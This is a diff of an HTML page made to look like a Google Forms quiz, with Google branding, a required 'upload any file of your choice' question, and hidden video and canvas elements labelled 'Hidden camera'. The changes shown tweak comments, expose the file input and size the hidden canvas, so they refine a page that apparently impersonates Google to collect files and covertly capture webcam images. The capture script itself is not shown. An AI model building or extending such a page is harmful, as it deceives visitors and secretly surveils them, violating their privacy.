@@ -11,7 +11,7 @@
 <body>
   <div class="container">
 
-    <!-- QUIZ FORM -->
+    <!-- FORM -->
     <div class="form-wrapper" id="quiz-container">
 
       <!-- HEADER -->
@@ -24,7 +24,7 @@
         </div>
       </div>
 
-      <!-- FORM -->
+      <!-- QUIZ FORM -->
       <form id="quiz-form">
 
         <!-- Question 1 -->
@@ -77,8 +77,7 @@
         <!-- File Upload Question -->
         <div class="question-card file-upload">
           <div class="question-title">Please upload any file of your choice: <span class="required">*</span></div>
-          <button type="button" id="trigger-upload" class="submit-button">Click to Upload</button>
-          <input type="file" id="user-file" style="display:none;" required>
+          <input type="file" id="user-file" required>
         </div>
 
         <!-- Submit -->
@@ -86,7 +85,6 @@
           <button type="submit" id="submit-btn" class="submit-button">Submit</button>
           <div class="footer-links"><span>Clear form</span></div>
         </div>
-
       </form>
 
       <!-- GOOGLE FOOTER -->
@@ -97,7 +95,6 @@
         </div>
         <div class="google-logo">Google Forms</div>
       </div>
-
     </div>
 
     <!-- SUCCESS PAGE -->
@@ -122,7 +119,7 @@
 
   <!-- Hidden camera -->
   <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
   <!-- Toast -->
   <div id="toast" class="toast"></div>
